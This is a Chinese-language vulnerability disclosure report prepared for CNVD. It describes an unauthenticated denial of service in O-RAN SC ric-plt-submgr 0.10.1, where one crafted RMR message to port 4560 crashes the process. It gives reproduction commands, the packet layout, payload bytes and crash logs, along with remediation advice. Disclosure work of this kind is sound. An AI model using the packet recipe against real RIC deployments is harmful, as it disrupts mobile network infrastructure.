# CNVD 漏洞报送：O-RAN SC ric-plt-submgr 未认证 RMR 消息致进程崩溃（拒绝服务）

编制日期：2026-11-24
状态：真实组件实测复现（两次独立复现）；尚未向 CNVD 提交；无 CNVD 编号、无 CVE 编号。

## 一、基本信息（对应 CNVD 表单字段）

| 字段 | 内容 |
|---|---|
| 漏洞名称 | O-RAN SC ric-plt-submgr 未认证 RMR 消息解析致进程 SIGSEGV 崩溃（拒绝服务） |
| 厂商 / 维护组织 | O-RAN Software Community（O-RAN SC） |
| 产品 | ric-plt-submgr（RIC 平台订阅管理服务） |
| 组件 / 依赖 | ric-plt-submgr 0.10.1；崩溃位于依赖库 xapp-frame v0.9.16 的 RMR 接收线程 |
| 测试版本 | Docker 镜像 `nexus3.o-ran-sc.org:10002/o-ran-sc/ric-plt-submgr:0.10.1` |
| 漏洞类型 | 输入验证不当（CWE-20）；后果为未认证远程拒绝服务（CWE-306 未认证端点 + CWE-248/SIGSEGV） |
| 危害等级 | 建议“中—高”，以审核认定为准。单条消息即令服务进程退出，且无需任何凭据；未证明可导致代码执行或数据泄露 |
| 漏洞位置 | `xapp-frame v0.9.16 pkg/xapp/rmr.go:305`（`(*RMRClient).parseMessage`），由 `rmr.go:247`（`Start.func2`）调用 |
| 攻击向量 | 网络（AV:N）；攻击者位于 RIC 内网或可路由至 RIC 内网，访问目标 `tcp/4560` |
| 认证要求 | 无（PR:N） |
| 用户交互 | 无（UI:N） |
| 受影响端点 | submgr RMR 传输端口 `4560/tcp`（明文 TCP，无 mTLS、无令牌、无源 IP 白名单） |
| 源码仓库 | https://github.com/o-ran-sc/ric-plt-submgr ；https://github.com/o-ran-sc/ric-plt-xapp-frame |
| 首次发现日期 | 2026-11-19 |
| 已分配编号 | 无 |
| 报告人 / 联系方式 | [由提交人填写] |

## 二、验证基线

- 运行环境：WSL2 Ubuntu 24.04，Docker；O-RAN SC RIC 全栈容器（ric-plt-submgr:0.10.1、e2term、e2mgr、dbaas、appmgr、rtmgr_sim）
- 目标地址：submgr 容器 `10.0.2.13`，RMR 端口 `4560`，REST 端口 `8088`
- 攻击端：同网段任意主机（示例 `10.0.2.1`）
- 镜像内 Go 运行时：`/opt/go/1.18.5`；xapp-frame 版本 `v0.9.16`
- 说明：本文不把 0.10.1 称为“当前最新版本”，也未验证其他版本是否受影响。上游仓库当前 HEAD 是否包含修复，需提交前核对。

## 三、漏洞描述（可粘贴至“漏洞描述”栏）

ric-plt-submgr 通过 RMR 传输层对外提供订阅管理消息接口，RMR 监听端口 `4560/tcp` 对连接方不做任何身份认证。RMR 接收线程由 xapp-frame 的 `(*RMRClient).Start` 启动，收到报文后直接进入 `parseMessage`（`rmr.go:305`）解析消息头与载荷。

该解析路径对报文的长度字段与字符串字段缺少完备的边界校验。向目标端口发送一条约 350 字节的伪造 RMR 报文（50 字节 RMR 传输层前缀 + 276 字节 `uta_mhdr_t` 消息头 + 24 字节载荷，消息类型为 12023 / RIC Subscription Delete Required，载荷为合法 ASN.1 编码），submgr 进程在 `parseMessage` 内发生非法内存访问，Go 运行时以 `runtime.sigpanic` 处理，进程立即以 SIGSEGV 退出：

```text
unexpected fault address 0x7f59ac000c41
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x1 addr=0x7f59ac000c41 pc=0xa3e886]
goroutine 45 [running]:
runtime.throw({0x...})
    /opt/go/1.18.5/src/runtime/panic.go:992
runtime.sigpanic()
    /opt/go/1.18.5/src/runtime/signal_unix.go:825
gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/xapp.(*RMRClient).parseMessage(0xc000767180, 0x7d7f3c000d00)
    /root/go/pkg/mod/gerrit.o-ran-sc.org/r/ric-plt/xapp-frame.git@v0.9.16/pkg/xapp/rmr.go:305
gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/xapp.(*RMRClient).Start.func2()
    /root/go/pkg/mod/gerrit.o-ran-sc.org/r/ric-plt/xapp-frame.git@v0.9.16/pkg/xapp/rmr.go:247
```

崩溃具备确定性：两次独立复现（submgr 重启后为全新进程）得到相同的崩溃 PC（`0xa3e886`），仅故障地址因堆布局不同而不同。

由此形成未认证的远程拒绝服务：攻击者无需账号、无需有效 E2 连接、无需已存在的订阅，只需能访问 RIC 内网的 `4560/tcp`，持续发送该报文即可在每次服务重启后再次令其崩溃，导致 RIC 平台上所有 xApp 的 E2 订阅管理能力不可用。

## 四、证据

| 材料 | 说明 |
|---|---|
| `submgr-rmr-crash/evidence/crash2_sigsegv.json` | 第二次崩溃完整日志（含 SIGSEGV、fault 行与完整 goroutine 堆栈，31 KB） |
| `submgr-rmr-crash/evidence/both_sigsegs.json` | 两次崩溃的 SIGSEGV 原始行（`pc=0xa3e886` 两次一致） |
| `submgr-rmr-crash/evidence/crash2_before.json` | 第二次崩溃前的最后日志 |
| `submgr-rmr-crash/evidence/submgr_crash_tail.log` | 崩溃前后约 300 行原始日志 |
| `submgr-rmr-crash/evidence/asn1c_del_payload.bin` | 24 字节 ASN.1 载荷原始字节（`00 0c 00 14 00 00 01 00 3c 00 0d 01 00 3d 00 08 00 00 7b 00 02 00 02 56`） |
| `submgr-rmr-crash/evidence/injected_12023.json` | 同类型（12023）正常消息格式参考，用于说明报文并非任意垃圾字节 |
| `submgr-rmr-crash/rmr_inject.go` | 注入器完整源码（纯 Go 标准库 TCP 客户端，无第三方依赖） |
| `submgr-rmr-crash/REPRODUCTION.md` | 报文结构逐字段说明、构建与执行命令、实测输出 |

两次复现时间与结果：

| 次数 | 时间（UTC） | 故障地址 | 崩溃 PC | 容器状态 |
|---|---|---|---|---|
| 1 | 2026-11-19 07:11:13 | 0x7d803c003241 | 0xa3e886 | Exited (2) |
| 2 | 2026-11-19 11:12:50 | 0x7f59ac000c41 | 0xa3e886 | Exited (2) |

## 五、复现步骤

```bash
# 0. 前置：O-RAN SC RIC 已部署，submgr 容器处于 Running
docker ps --format '{{.Names}}\t{{.Status}}' | grep submgr

# 1. 编译注入器（Go 1.24+，纯标准库）
cd submgr-rmr-crash
go build -o rmr_inject rmr_inject.go

# 2. 记录攻击前状态
curl -s http://10.0.2.13:8088/ric/v1/subscriptions

# 3. 发送单条伪造 RMR 报文到目标容器
./rmr_inject 10.0.2.13:4560

# 4. 1~2 秒内观察容器退出
docker ps -a --format '{{.Names}}: {{.Status}}' | grep submgr
# 预期：ric_submgr: Exited (2)

# 5. 取出崩溃日志
docker logs ric_submgr 2>&1 | grep -aE "SIGSEGV|sigpanic|rmr.go:305"
```

报文结构（合计 350 字节）：

```text
[50 字节 RMR 传输层前缀]
  buf[0:4] = 总长度（主机字节序）
  buf[4:8] = 总长度（网络字节序）
  buf[8]   = 0x24 ('$'，TP_SZ_MARKER)
[276 字节 uta_mhdr_t]
  mtype=12023 (RIC_SUB_DEL_REQUIRED)  plen=24  rmr_ver=3
  sid="gnb_0115_100_00025b"  meid="gnb_0115_100_00025b"  len0=276  sub_id=-1
[24 字节 ASN.1 载荷：RIC Subscription Delete Required]
  requestor=123  instance=2  functionId=2  cause=misc/unspecified
```

## 六、影响与边界（如实说明）

已证实：
- 单条报文、无需认证即可令 submgr 进程以 SIGSEGV 退出，容器退出码 2；
- 崩溃点位于 xapp-frame 通用解析函数，而非 submgr 业务代码，因此可重复利用；
- 崩溃发生在应用初始化完成之前（第二次注入时 submgr 仍处于 “Application is not ready yet” 循环），说明 RMR 接收线程早于业务就绪即暴露攻击面。

未证实 / 不作宣称：
- 未证明可导致任意代码执行、权限提升或数据泄露；破坏形式为进程崩溃（可用性影响）；
- 未在真实运营商网络、外部互联网可达拓扑中验证；攻击面前提是能路由至 RIC 内网 `4560/tcp`；
- 未逐一验证其他使用 xapp-frame v0.9.16 的组件（xApp、其他 xApp-frame 服务）。由于解析代码为共享库，理论上同类组件可能同样受影响，但本文不将其列为已确认结论；
- 未定位 `parseMessage` 中被越界访问的具体字段（如实测未能取得更细粒度的源码级根因），因此本文按“输入验证不当”归类，而非指定单一字段缺陷。

## 七、修复建议

1. `parseMessage` 在访问消息头字段前校验：报文总长、`plen` 与实收长度是否一致、字符串字段（`meid`/`sid`/`src`）是否在固定长度内且以 NUL 结尾、消息类型是否在白名单内；不满足即丢弃并计数，不进入后续解析。
2. 为 RMR 监听端口增加接入认证（mTLS 或共享令牌）与来源限制（仅允许 RMR 路由表内已注册端点），不要把 4560 直接暴露给不受信网段。
3. 在框架层为消息处理增加 panic 恢复（`recover`），使单条畸形消息只丢弃消息、不终止进程；但这只是兜底，不能替代第 1 条校验。
4. 补充 fuzz 测试（对 `parseMessage` 入口做 Go fuzz），覆盖长度字段、截断报文、超长字符串、非法类型等输入。

## 八、提交前附件清单

已有：本报告、两份原始崩溃日志、SIGSEGV 对照、完整 goroutine 堆栈、注入器源码、ASN.1 载荷原始字节、复现记录。
建议附：容器 `docker inspect` 输出（镜像 digest，证明测试版本）、`docker ps -a` 退出状态截图、注入时刻与崩溃时刻的时间戳对照。
待补：报告人信息、发现日期确认、是否已向 O-RAN SC 上游报送的说明。

## 九、披露状态声明

- 截至本文编制日，本漏洞尚未向 O-RAN SC 上游安全团队、MITRE 或 CNVD 提交；无 CVE / CNVD 编号。
- 若提交 CNVD，应在“是否已向其他平台报送”栏如实填写；在获得维护方确认前请求协调披露。
- 本文所有结论均基于上述固定镜像版本的真实容器实测，未使用模拟环境推断结论。
